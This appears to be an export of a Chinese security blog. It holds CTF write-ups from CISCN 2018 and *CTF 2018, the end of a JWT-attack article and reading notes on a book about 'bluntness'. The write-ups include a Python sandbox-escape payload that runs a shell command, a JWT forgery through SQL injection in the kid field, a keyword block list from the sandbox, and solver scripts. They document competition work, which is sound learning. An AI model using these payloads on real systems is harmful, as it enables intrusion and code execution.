开发者应升级相应库到最新版本，因为旧版本可能存在致命缺陷。 0x05 参考文章 https://jwt.io/introduction/ https://www.cnblogs.com/anny0404/p/5318692.html https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/ https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ ","permalink":"https://ret2neo.cn/post/180503jwt/","summary":"本文首发 Freebuf 。略有更新。\n0x01 初识JWT JWT （ JSON Web Token 的缩写）是一串带有声明信息的字符串，由服务端用加密算法对信息签名来保证其完整性和不可伪造。Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息，JWT可用于身份认证、会话状态维持、信息交换等。\nJWT 由三部分构成，分别称为 header 、payload 和 signature ，各部分用. 相连构成一个完整的Token，形如xxxxx.yyyyy.zzzzz 。\n分别看下各个部分：\nheader ：\n使用一个JSON格式字符串声明token的类型和签名用的算法等，形如{\u0026quot;alg\u0026quot;: \u0026quot;HS256\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;JWT\u0026quot;} 。该字符串经过Base64Url编码后形成JWT的第一部分xxxxx。\nBase64Url编码可以用这段代码直观理解：\n1 2 3 4 5 6 7 8 9 10 from base64 import * def base64URLen(s): t0=b64encode(s) t1=t0.strip(\u0026#39;=\u0026#39;).replace(\u0026#39;+\u0026#39;,\u0026#39;-\u0026#39;).replace(\u0026#39;/\u0026#39;,\u0026#39;_\u0026#39;) return t1 def base64URLde(s): t0=s.replace(\u0026#39;-\u0026#39;,\u0026#39;+\u0026#39;).replace(\u0026#39;_\u0026#39;,\u0026#39;/\u0026#39;) t1=t0+\u0026#39;=\u0026#39;*(4-len(t0)%4)%4 return b64decode(t1) payload :\n使用一个JSON格式字符串描述所要声明的信息，分为 registered 、 public 、 和 private 三类，形如{\u0026quot;name\u0026quot;: \u0026quot;John Doe\u0026quot;, \u0026quot;admin\u0026quot;: true} ，具体信息可参考 RFC7519 的 JWT claims 部分。","title":"JSON Web Token的认识与攻击"},{"content":"全部赛题：https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn\nWEB easyweb http://114.116.26.217/\n学习了一点 json web token ，但是没想到是个脑洞。（应该只是非预期解）\n账户admin，空密码登陆。\nciscn{2a36b5f78a1d6a107212d82ee133c421}\n有师傅在群里说HMAC的密钥放在数据库里，而kid是个注入点，可以通过联合查询控制查询结果，然后伪造签名。\n从开始做到赛后试着复现都一直纠结alg 是sha256的问题，以为密钥是用来加盐，然后就自己胡乱加盐，陷入困境。后来仔细了解了一下，HMAC就算是一个比较复杂的加盐算法吧，自己加没啥意思，而且jwt也不支持纯粹sha256。\n事实证明把sha256改成HS256就好了。这里有两种可能，一是后端写死算法为HS256，然后header里面写成了sha256，二是算法根据alg 的值确定，我们传入HS256所以按照HS256来计算。\n经过测试发现后端甚至根本不在乎有没alg ，，，，所以说做题思路还是要灵活一些。\nkid的值随意传，奇怪一点就行，只要让它查询不出结果，那么我们联合查询的值就会作为最后的密钥。\n参考：\nhttps://www.jianshu.com/p/e64d96b4a54d https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data https://docs.python.org/2/library/hmac.html MISC 验证码 本题目为验证码破解，选手需在指定时间完成对验证码的破解，成功后获取Flag。请使用队伍token进行登陆。 参考数据：https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8\nhttps://game.captcha.qq.com/hslj/html/hslj/\n题目有点问题，手动玩了一会儿。\nciscn{12qiftb1qj12mbzm1xmjd2iix2ibqz7i}\n后来换成输验证码得flag了。\npicture 请从图中找出密码。\nbinwalk -e 分离得到 97E4 和 97E4.zlib 两个文件，后者是前者的 zlib 压缩文件。\n1 2 3 import zlib print zlib.decompress(open(\u0026#39;97E4.zlib\u0026#39;,\u0026#39;rb\u0026#39;).read())==open(\u0026#39;97E4\u0026#39;,\u0026#39;rb\u0026#39;).read() # got True 文件97E4 内容的base64解码后稍做处理是一个加密的压缩包。\n1 2 3 4 5 6 7 8 import base64 t=open(\u0026#39;97E4\u0026#39;,\u0026#39;rb\u0026#39;).read() m=base64.b64decode(t).encode(\u0026#34;hex\u0026#34;) n=\u0026#39;\u0026#39; for i in range(len(m)/4): n+=m[i*4+2:i*4+4]+m[i*4:i*4+2] print n # 504b040300140001000030904c97542e7f25005a0000004e0000000400006f6365647ab0d6a3f3bbc8060511ce0c8b62793d8d39caf2b644325509c991cb202dc981e60ea354ca8de79f3bc187f6719f4738adf24fa3ca2d9d7b8adda175d833d1c0264225c62d86784977cf5973989ea77ddbbf31060aef47124fca4b500201003f00140001000030904c97542e7f25005a0000004e00000004002400000000000000200000000000006f636564000a002000000000000100189800e452da8501d3bcf6ace5da8701d3bcf6ace5da8701d34b500605000000000001000100560000007c000000dc505b74796f68206e2e325d370a0d3e3e203e7da87da87da80a0d0a0d7254636162656361206b6d28736f207465726563746e63206c61206c616c74733a290a0d20206946656c2220703c737965686c6c3023223e202c696c656e3120202c6e693c206f6d7564656c0d3e200a2020a820a87da87d0d7d5a0a7265446f766973696f69456e7272726f203a7da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da83c20202d617073736f7764723b200d293e0a3e3e0020 大致内容如下：\n对比得到密码： integer division or modulo by zero\n得到一串编码后字符：\n解码得到 CISCN{C16E6F6E065DA0306E318D095C68BDC0}\nrun 参考链接：\nhttp://cauc.me/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/ https://blog.csdn.net/qq_35078631/article/details/78504415 1 2 3 payload: print ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(\u0026#39;func_global\u0026#39;+\u0026#39;s\u0026#39;)[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;].__dict__[\u0026#39;sy\u0026#39;+\u0026#39;stem\u0026#39;](\u0026#39;ca\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39; /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb\u0026#39;) # ciscn{db87226edc7f9aff82a6b524053eef9e} 顺便dump下来几个文件\ncpython.py\n1 2 3 4 5 6 7 8 9 10 from ctypes import pythonapi,POINTER,py_object _get_dict = pythonapi._PyObject_GetDictPtr _get_dict.restype = POINTER(py_object) _get_dict.argtypes = [py_object] del pythonapi,POINTER,py_object def get_dict(ob): return _get_dict(ob).contents.value sandbox.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Date : 2018-04-09 23:30:58 # @Author : Xu (you@example.org) # @Link : https://xuccc.github.io/ # @Version : $Id$ from sys import modules from cpython import get_dict from types import FunctionType main = modules[\u0026#39;__main__\u0026#39;].__dict__ origin_builtins = main[\u0026#39;__builtins__\u0026#39;].__dict__ def delete_type(): type_dict = get_dict(type) del type_dict[\u0026#39;__bases__\u0026#39;] del type_dict[\u0026#39;__subclasses__\u0026#39;] def delete_func_code(): func_dict = get_dict(FunctionType) del func_dict[\u0026#39;func_code\u0026#39;] def safe_import(__import__,whiteList): def importer(name,globals={},locals={},fromlist=[],level=-1): if name in whiteList: return __import__(name,globals,locals,fromlist,level) else: print \u0026#34;HAHA,[%s] has been banned~\u0026#34; % name return importer class ReadOnly(dict): \u0026#34;\u0026#34;\u0026#34;docstring for ReadOnlu\u0026#34;\u0026#34;\u0026#34; def __delitem__(self,keys): raise ValueError(\u0026#34;:(\u0026#34;) def pop(self,key,default=None): raise ValueError(\u0026#34;:(\u0026#34;) def popitem(self): raise ValueError(\u0026#34;:(\u0026#34;) def setdefault(self,key,value): raise ValueError(\u0026#34;:(\u0026#34;) def __setitem__(self,key,value): raise ValueError(\u0026#34;:(\u0026#34;) def __setattr__(self, name, value): raise ValueError(\u0026#34;:(\u0026#34;) def update(self,dict,**kwargs): raise ValueError(\u0026#34;:(\u0026#34;) def builtins_clear(): whiteList = \u0026#34;raw_input SyntaxError ValueError NameError Exception __import__\u0026#34;.split(\u0026#34; \u0026#34;) for mod in __builtins__.__dict__.keys(): if mod not in whiteList: del __builtins__.__dict__[mod] def input_filter(string): ban = \u0026#34;exec eval pickle os subprocess input sys ls cat\u0026#34;.split(\u0026#34; \u0026#34;) for i in ban: if i in string.lower(): print \u0026#34;{} has been banned!\u0026#34;.format(i) return \u0026#34;\u0026#34; return string # delete_type(); del delete_type delete_func_code();del delete_func_code builtins_clear();del builtins_clear whiteMod = [] origin_builtins[\u0026#39;__import__\u0026#39;] = safe_import(__import__,whiteMod) safe_builtins = ReadOnly(origin_builtins);del ReadOnly main[\u0026#39;__builtins__\u0026#39;] = safe_builtins;del safe_builtins del get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType del __builtins__, __doc__, __file__, __name__, __package__ print \u0026#34;\u0026#34;\u0026#34; ____ | _ \\ _ _ _ __ | |_) | | | | \u0026#39;_ \\ | _ \u0026lt;| |_| | | | | |_| \\_\\\\__,_|_| |_| Escape from the dark house built with python :) Try to getshell then find the flag! \u0026#34;\u0026#34;\u0026#34; while 1: inp = raw_input(\u0026#39;\u0026gt;\u0026gt;\u0026gt;\u0026#39;) cmd = input_filter(inp) try: exec cmd except NameError, e: print \u0026#34;wow something lose!We can\\\u0026#39;t find it ! D:\u0026#34; except SyntaxError,e: print \u0026#34;Noob! Synax Wrong! :(\u0026#34; except Exception,e: print \u0026#34;unknow error,try again :\u0026gt;\u0026#34; /home/ctf/bin\n题目备份 https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn\n","permalink":"https://ret2neo.cn/post/180430ciscn/","summary":"全部赛题：https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn\nWEB easyweb http://114.116.26.217/\n学习了一点 json web token ，但是没想到是个脑洞。（应该只是非预期解）\n账户admin，空密码登陆。\nciscn{2a36b5f78a1d6a107212d82ee133c421}\n有师傅在群里说HMAC的密钥放在数据库里，而kid是个注入点，可以通过联合查询控制查询结果，然后伪造签名。\n从开始做到赛后试着复现都一直纠结alg 是sha256的问题，以为密钥是用来加盐，然后就自己胡乱加盐，陷入困境。后来仔细了解了一下，HMAC就算是一个比较复杂的加盐算法吧，自己加没啥意思，而且jwt也不支持纯粹sha256。\n事实证明把sha256改成HS256就好了。这里有两种可能，一是后端写死算法为HS256，然后header里面写成了sha256，二是算法根据alg 的值确定，我们传入HS256所以按照HS256来计算。\n经过测试发现后端甚至根本不在乎有没alg ，，，，所以说做题思路还是要灵活一些。\nkid的值随意传，奇怪一点就行，只要让它查询不出结果，那么我们联合查询的值就会作为最后的密钥。\n参考：\nhttps://www.jianshu.com/p/e64d96b4a54d https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data https://docs.python.org/2/library/hmac.html MISC 验证码 本题目为验证码破解，选手需在指定时间完成对验证码的破解，成功后获取Flag。请使用队伍token进行登陆。 参考数据：https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8\nhttps://game.captcha.qq.com/hslj/html/hslj/\n题目有点问题，手动玩了一会儿。\nciscn{12qiftb1qj12mbzm1xmjd2iix2ibqz7i}\n后来换成输验证码得flag了。\npicture 请从图中找出密码。\nbinwalk -e 分离得到 97E4 和 97E4.zlib 两个文件，后者是前者的 zlib 压缩文件。\n1 2 3 import zlib print zlib.decompress(open(\u0026#39;97E4.zlib\u0026#39;,\u0026#39;rb\u0026#39;).read())==open(\u0026#39;97E4\u0026#39;,\u0026#39;rb\u0026#39;).read() # got True 文件97E4 内容的base64解码后稍做处理是一个加密的压缩包。\n1 2 3 4 5 6 7 8 import base64 t=open(\u0026#39;97E4\u0026#39;,\u0026#39;rb\u0026#39;).read() m=base64.b64decode(t).encode(\u0026#34;hex\u0026#34;) n=\u0026#39;\u0026#39; for i in range(len(m)/4): n+=m[i*4+2:i*4+4]+m[i*4:i*4+2] print n # 504b040300140001000030904c97542e7f25005a0000004e0000000400006f6365647ab0d6a3f3bbc8060511ce0c8b62793d8d39caf2b644325509c991cb202dc981e60ea354ca8de79f3bc187f6719f4738adf24fa3ca2d9d7b8adda175d833d1c0264225c62d86784977cf5973989ea77ddbbf31060aef47124fca4b500201003f00140001000030904c97542e7f25005a0000004e00000004002400000000000000200000000000006f636564000a002000000000000100189800e452da8501d3bcf6ace5da8701d3bcf6ace5da8701d34b500605000000000001000100560000007c000000dc505b74796f68206e2e325d370a0d3e3e203e7da87da87da80a0d0a0d7254636162656361206b6d28736f207465726563746e63206c61206c616c74733a290a0d20206946656c2220703c737965686c6c3023223e202c696c656e3120202c6e693c206f6d7564656c0d3e200a2020a820a87da87d0d7d5a0a7265446f766973696f69456e7272726f203a7da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da83c20202d617073736f7764723b200d293e0a3e3e0020 大致内容如下：","title":"第十一届全国大学生信息安全竞赛“创新实践能力赛”"},{"content":"Web simpleweb nc 47.75.4.252 23333\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var net = require(\u0026#39;net\u0026#39;); flag=\u0026#39;fake_flag\u0026#39;; var server = net.createServer(function(socket) { socket.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { //m = data.toString().replace(/[\\n\\r]*$/, \u0026#39;\u0026#39;); ok = true; arr = data.toString().split(\u0026#39; \u0026#39;); arr = arr.map(Number); if (arr.length != 5) ok = false; arr1 = arr.slice(0); arr1.sort(); for (var i=0; i\u0026lt;4; i++) if (arr1[i+1] == arr1[i] || arr[i] \u0026lt; 0 || arr1[i+1] \u0026gt; 127) ok = false; arr2 = [] for (var i=0; i\u0026lt;4; i++) arr2.push(arr1[i] + arr1[i+1]); val = 0; for (var i=0; i\u0026lt;4; i++) val = val * 0x100 + arr2[i]; if (val != 0x23332333) ok = false; if (ok) socket.write(flag+\u0026#39;\\n\u0026#39;); else socket.write(\u0026#39;nope\\n\u0026#39;); }); //socket.write(\u0026#39;Echo server\\r\\n\u0026#39;); //socket.pipe(socket); }); HOST = \u0026#39;0.0.0.0\u0026#39; PORT = 23333 server.listen(PORT, HOST); 本地爆破出符合程序判断的数字串，然后使用socket提交：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # understand JavaScript Code # var arr = [22,12,3,43,56,47,4]; # arr.sort(); # console.log(arr);//[12, 22, 3, 4, 43, 47, 56] # console.log(arr.slice(0));//[12, 22, 3, 4, 43, 47, 56] u=128 def aLSSb(a,b): return str(a)\u0026lt;str(b) for i0 in xrange(0x00,u): for i1 in xrange(0x00,u): if aLSSb(i0,i1) and i0+i1 == 0x23: for i2 in xrange(0x00,u): if aLSSb(i1,i2) and i1+i2==0x33: for i3 in xrange(0x00,u): if aLSSb(i2,i3) and i2+i3==0x23: for i4 in xrange(0x00,u): if aLSSb(i3,i4) and i3+i4==0x33: r=[i0,i1,i2,i3,i4] print r data_send=\u0026#39; \u0026#39;.join((map(str,r))) #[15, 20, 31, 4, 47] import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#39;47.75.4.252\u0026#39;, 23333)) s.send(data_send) print \u0026#34;send: \u0026#34;, data_send print \u0026#34;wait for a while here...........\u0026#34; buffer = [] while True: d = s.recv(1024) if d: buffer.append(d) else: break data = \u0026#39;\u0026#39;.join(buffer) print \u0026#34;rcev: \u0026#34;,data s.close() # *ctf{web_chal_made_by_binary_players_lol} MISC yafu nc 47.75.4.252 10004\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 #!/usr/bin/python3 import random,sys import socketserver import binascii import os import hmac,hashlib from hashlib import sha256 from Crypto.Util.number import isPrime import string from subprocess import run, PIPE, TimeoutExpired from flag import FLAG basedir = \u0026#39;/home/sixstars/*ctf/yafu/yafu-1.34\u0026#39; cmd = basedir+\u0026#39;/yafu\u0026#39; timelimit = 2 def do_init(): url = \u0026#39;https://sourceforge.net/projects/yafu/files/1.34/yafu-1.34.zip/download\u0026#39; if os.path.isfile(cmd): return os.system(\u0026#34;wget %s -O %s/yafu-1.34.zip\u0026#34; % (url, basedir)) os.system(\u0026#34;unzip %s/yafu-1.34.zip -d %s/\u0026#34; % (basedir, basedir)) os.system(\u0026#34;chmod +x %s\u0026#34; % (cmd)) def do_factor(num): try: res = run(cmd, stdout=PIPE, input=(\u0026#39;factor(%d)\u0026#39;%num).encode(), timeout=timelimit) except TimeoutExpired: return False tmp = res.stdout.decode() tmp = tmp[tmp.find(\u0026#39;***factors found***\\n\\n\u0026#39;)+21:].split(\u0026#39;\\n\u0026#39;) for line in tmp: pos = line.find(\u0026#39; = \u0026#39;) if pos == -1: break factor = int(line[pos+3:]) if line[0] == \u0026#39;P\u0026#39; and not isPrime(factor): return True return False class Task(socketserver.BaseRequestHandler): def proof_of_work(self): proof = \u0026#39;\u0026#39;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) print(proof) digest = sha256(proof.encode(\u0026#39;ascii\u0026#39;)).hexdigest() self.request.send(str.encode(\u0026#34;sha256(XXXX+%s) == %s\\n\u0026#34; % (proof[4:],digest))) self.request.send(str.encode(\u0026#39;Give me XXXX:\u0026#39;)) x = self.request.recv(10).decode() x = x.strip() wtfpy3 = x+proof[4:] if len(x) != 4 or sha256(wtfpy3.encode(\u0026#39;ascii\u0026#39;)).hexdigest() != digest: return False return True def handle(self): if not self.proof_of_work(): return do_init() self.request.sendall(str.encode(\u0026#34;No bruteforce required. Do not DOS plz \u0026gt;_\u0026lt;\\n\u0026#34;)) self.request.sendall(str.encode(\u0026#34;The number to factorize: \u0026#34;)) x = self.request.recv(1024) try: x = int(x, 16) except: return if do_factor(x): self.request.sendall(str.encode(\u0026#34;What happened? Anyway your flag here: %s\\n\u0026#34; % FLAG)) else: self.request.sendall(str.encode(\u0026#34;Bye\\n\u0026#34;)) class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10004 print(HOST) print(PORT) server = ThreadedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import socket import re import string import itertools import hashlib def crack_sha256(data_part,hash): for i in itertools.product(string.ascii_letters+string.digits,repeat=4): if hashlib.sha256(\u0026#39;\u0026#39;.join(i)+data_part).hexdigest()==hash: return \u0026#39;\u0026#39;.join(i).strip() def get(s): buffer = [] try: while True: d = s.recv(10) if d: buffer.append(d) except Exception as e: data = \u0026#39;\u0026#39;.join(buffer) return data socket.setdefaulttimeout(2) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#39;47.75.4.252\u0026#39;, 10004)) # ------------ proof_din=get(s) print proof_din r=re.findall(\u0026#34;sha256\\(XXXX\\+([0-9a-zA-Z]{16})\\) == ([0-9a-z]{64})\u0026#34;,proof_din) # print r proof_part,sha_value=r[0][0],r[0][1] # print proof_part,sha_value proof_part_0=crack_sha256(proof_part,sha_value) s.send(proof_part_0) print \u0026#34;XXXX is %s\u0026#34;%proof_part_0 # ------------ print get(s) s.send(\u0026#39;286b7fb2af5f5d27d216771c90ac6f43a9892a690c48e4b06bcbc1cd\u0026#39;) print get(s) 原理 https://github.com/sixstars/starctf2018/blob/master/misc-yafu/README.md\nWhen yafu delete factors, it fails to update the factor type correctly. So it\u0026rsquo;s possible to fool yafu if you use a smooth number which consists of many small primes. Follow the link in solve.py for more details.\nI expect someone would find it when feeding some special cases (like the smooth number as mentioned above) towards yafu. But maybe most players instead focused on the prime test. I released a hint (yafu can be wrong) but seems (as xdd suggested) they just turned to prime test inside yafu lol.\n题目备份 https://github.com/sixstars/starctf2018\n","permalink":"https://ret2neo.cn/post/180426starctf/","summary":"Web simpleweb nc 47.75.4.252 23333\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var net = require(\u0026#39;net\u0026#39;); flag=\u0026#39;fake_flag\u0026#39;; var server = net.createServer(function(socket) { socket.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { //m = data.toString().replace(/[\\n\\r]*$/, \u0026#39;\u0026#39;); ok = true; arr = data.toString().split(\u0026#39; \u0026#39;); arr = arr.","title":"starctf writeup"},{"content":"by 渡边淳一\n读后感 迟钝的益处 抗压能力更强 专注创造价值 充分发挥潜力 能够坚持不懈 =\u0026gt; 更大的成功概率（事业，爱情） 适应能力更强 适应物理环境 乐观开朗，积极进取 怎样变迟钝 能做些什么 眼耳鼻舌身意的敏感程度很大一部分是天生的，难以改变，但是并非完全没有可能。\n磨练。 再锋利的刀以合适的角度持续磨砺也会钝化。强光刺目，三秒就瞎，轰鸣入耳，不久渐聋，傻子不起妄念，呆子心如止水。但问题是这样的自虐是否偏离初衷？ 生理上 锻炼身体使体魄强健，血液畅流，强化适应环境的能力。 心理上 训练专注力：不因敏锐的感官而分神 参禅打坐，观照冥想？据说刹那有万千念头起灭，自由控制是可能的吗？ 积极的思维方式 平衡敏感与迟钝 毕竟坐怀不乱与不解风情有所不同。 多思考他人的动机，尝试理解他人语言和行为的出发点。 少归因到自己身上。 不忧虑无法改变的事情。 理论上，一切皆可理解，世事皆可原谅。 要义 心无一物是第一义，但不切实际也无意义。 第二义：恕己容人，淡化情绪，以积极的方式思考和引导自己。 反思 人生的一大部分乐趣在于体验悲欢，我们的目标并不是练成一块石头。 我们需要变得迟钝是因为不希望沉迷细节而失去对全局的掌控。 我们所谈论的敏锐和迟钝应该是在一个正常区间内的，超出这个区间的就是病，非意志所能左右。 如果不瞎，那么当一个东西出现在你眼前，你不可能真的看不见。迟钝应该是锻炼自己在意识上忽略它，如果它现在不重要的话。长此以往，形成惯性，只要盯着目标，其余的都将自然而然被忽略。到这时，就可以说是形成了有益的钝感力了。 评价 抛去观点不谈，全书论述并不严肃，逻辑也不很严谨，组织有些分散，一时没有读出作者对语言的驾驭能力。当然也可能是翻译不到位的缘故。\n本书带来了一个有价值的概念，并且用案例引发读者思考。但主要是介绍钝感的价值，距离可操作有一定距离。究其原因，是混淆了意志上的钝感和生理上的钝感。作者为了说明钝感的作用与价值，不可避免地将两者煮在一锅。但当我们明白了钝感很重要很有价值后，就会想提高自己的钝感。这时要明白面对生理上的钝感我们是无能为力的，就像男人再努力也觉得分娩可怖，免疫缺陷患者再努力也没法靠意志力抵抗病菌。也许自律神经经过训练可以被控制，但对大部分人来说这几乎是不可能的。\n所以我们所能做的，是在意识可控的层面提高迟钝度。忽略不紧要的，抑制不积极的，始终注意把握全局，坚定彻底地相信自我。\n此外，还可以利用一些心理学上的方法暗示自己。不需要觉得是在自我欺骗，毕竟终究每个念头都未必是真实，那么何不让有益的念头先入为主？\n各章要点 我们丧失了某种才能 在各行各业中取得成功的人们，当然拥有才能，但在他们的才能背后，一定隐藏着有益的钝感力。钝感就是一种才能，一种能让人们的才华开花结果，发扬光大的力量。 钝感的优越 迟钝在生理上的意义 蚊子叮咬，不抓挠，自然恢复。 愚钝在精神上的意义 表现平平的小K被上司怒骂而毫发不损，而不是沉浸其中，自责忧虑。（即时挨骂，也不气馁） 高才华且强自尊的O先生因退稿而一蹶不振，死气沉沉，恶性循环，再无成名之日。 在斥责声中成长的名医 对健康而言，最为重要的就是让自己全身的血液总是能够顺畅地流淌。因此，做事不要总是思前想后，即使别人说些不中听的话，听完后马上就能抛到脑后。这种有益的钝感，是保证血液畅通无阻的重要原因。 主任教授不停责骂，S医生频频点头称是。接受责骂，专注领会手术要领。多年后发现S医生以自我为中心，并不认真听人说话，并因此不计较他人言语，从而保持精神安定，心情愉悦。 控制血管的神经叫做自律神经，应尽量让其保持放松，不去刺激它。 血液因此畅流 我们的血管是由自律神经来控制的，拥有有益钝感力的人，其自律神经不易陷入异常的刺激当中，能够让血管一直保持舒张状态，从而使全身的血液可以畅通无阻地流遍全身。 自律神经 交感神经。兴奋。精神上紧张、不安、烦躁；情绪上恼怒、愤恨、憎恶；寒冷。 副交感神经。舒缓。神清气爽、开怀大笑、环境温暖。 老年人收容所。逗乐老年人以保持其血液流畅；胃溃疡源于精神压力。 精神压力的益处与害处。 自律神经努力使身体平衡，有益的钝感力可减轻其负担。 迟钝的五官 人们的各种感觉器官若过于敏感的话，会对人产生负面影响。钝感的人和敏感的人相比，前者不会造成器官的消耗，可以更为悠闲自在、胸襟开阔地长寿下去。 视觉、听觉、嗅觉、味觉、触觉过于敏感带来的痛苦。 睡眠良好的能人 睡得香甜，起得迅速，这种睡眠能力正是人的基本能力。没有睡眠能力的话，人们就不能保持健康的身体，就不能专心致志地工作。睡眠良好，这也是一种真正的才能。 在众多的钝感力当中，能够成为其核心代表的是良好的睡眠。我们称之为“睡眠能力”，这是人们所有的活动和健康的源泉。 入睡易，起床快可以相对多出六万个小时。 医生的夜班经历锻炼了作者随时起床的能力。 随时随地入睡的老太太和失眠的人群。 若左思右想，也于事无补，不如横下心来，闭眼休息。 得寸进尺的才能 有才能的人周围，肯定会有时常表扬他的人，而其本人也常因表扬而得寸进尺，这种“得寸进尺、得意忘形”的精神，不是所谓的卑鄙无耻，而是一种让人朝着光明的未来展翅高飞的原动力。 人都因鼓舞而奋进。 作者因酒保的鼓励而振作 画家A先生因邻居大婶的鼓励而努力练画 作者因中学语文老师的鼓励而走上写作道路 鼓励可能本身仅仅是鼓励，毕竟酒保不懂文学，大婶不懂艺术，但那种心理上积极 的感受意义非凡！ 语言极为重要。一句话既可以救活一个人，也可以杀死一个人。对于才能也是如此。 人能否成功，不只取决于才能的有无，而在于究竟能把人的才能发掘和引导出来多少，社会上所谓有才能的人，都有一个在适当时期，用适当方法将其才能发掘、引导出来的人。相反，人们口中那些没有才能的人，大多只是由于其潜在的才能没有在适当的时机被发掘和引导出来。 正确地在合适时机表扬孩子。进一步地，表扬自己。 肠胃钝感的男人 贫穷让A童年时多吃了些杂菌，练就坚强肠胃，多年后的一次晚宴后，大家都拉肚子，而他安然无恙。 钝感来自于锻炼，健忘是一副良药。 被爱的女神射中 在恋爱方面，钝感力也是必不可缺的。特别是当男人追求女人的时候，钝感可以成为一种有力的武器。若再加上诚实，则更如虎添翼。 男人和女人从根本上就是不同的生物，尤其肉体的原点完全相异。这些差距，不是通过语言上的交谈，就能解决的。 一位好猎手，只要看准了目标，无论被对方拒绝多少次，也要坚持追求，向女方倾诉自己的衷肠。没有这种坚韧而厚颜的精神，就无法将美丽的猎物捕捉到手。 其实很多女性都曾说，“就算多少有些不中意，但是在对方不厌其烦的邀请和竭尽全力的追求下，还是逐渐地被对方打开了心扉，或许还会开始喜欢……” 钝感的应用 不屈不挠地追求 钝感的肠胃 杂乱的房间 男女双方无论是生长环境、兴趣爱好，还是个人教养、价值观等不可能相同，然而结婚，就是不同的男女在一时热情的怂恿下，共同在一个狭小的家中生活。 为了维系婚姻生活 结婚生活就是一条漫长的容忍之路。 为了战胜癌症 从癌症的预防到治疗，以及治愈之后回归社会，在所有阶段，最重要的就是保持良好的心态，也就是所谓的钝感力。 女性的强大之一 “弱者，你的名字叫男人。”——男性是一种多么诚实、严谨、敏感的性别啊。相比之下，女性则大度、暧昧而钝感。 男女的钝感力差别 一千金，二公子 女性不怕出血 女性的强大之二 女性既不怕寒冷，也不怕出血和疼痛。在过去，分娩对于母亲和即将降生的婴儿来说，都是性命攸关的一道坎，女性如何才能闯过此道难关，竭尽全力将孩子生下，使人类得以持久地存在下去呢？为此，造物主想到的就是，将担当分娩重任的女性创造得更为坚韧而强壮。 不畏严寒。更厚的脂肪层。 不畏疼痛。分娩的疼痛。男性是靠精神上的力量来忍耐的。与之相比，女性对生理上的那种痛彻心肺的痛苦的忍耐力，却是出人意料的坚强。 感谢嫉妒和讽刺 在我们身边，经常会发生被朋友或同事嫉妒、中伤和刁难的事情。不要听到不中听的话就如临大敌，而要仔细思考对方那么说的原因，体察对方的心情。这种心胸宽广的钝感力，可以在我们的日常生活中起到极大的作用。 被嫉妒是一种肯定。 讽刺达不到目的。 恋爱的能力 喜欢对方，希望将彼此的恋爱关系延续下去的话，就要拥有原谅对方的胸怀。如果希望两个人永远相爱、幸福美满，在某种程度上就要能够原谅对方，钝感一些。这种钝感力，正是让恋爱关系长久维系的能力。 恋爱的初期，敏感是必要的。 长期的恋爱，钝感是重要的。 为了更好地生存 面对芸芸众生各式各样的毛病，有些人耿耿于怀，有些人不太在乎，有些人视若无睹。在这方面人们的感觉各自不同，但有一点非常明确，就是只有对各种令人不快的毛病忽略不计，才能开朗、大度地生活下去。 适应环境的能力 就算到了一个自然环境、人文环境都不相同的世界，也能开朗、健康的生活。 伟大的母爱 母爱集钝感力之大成。经过分娩的疼痛从自己腹中生出的孩子，无论做什么事都让母亲觉得可爱，亦可原谅。这种可以原谅一切的情感，正是产生钝感力的原点。 分娩之后的钝感 喂奶 夜里的哭闹 可爱的污渍 原谅孩子的母亲 语录 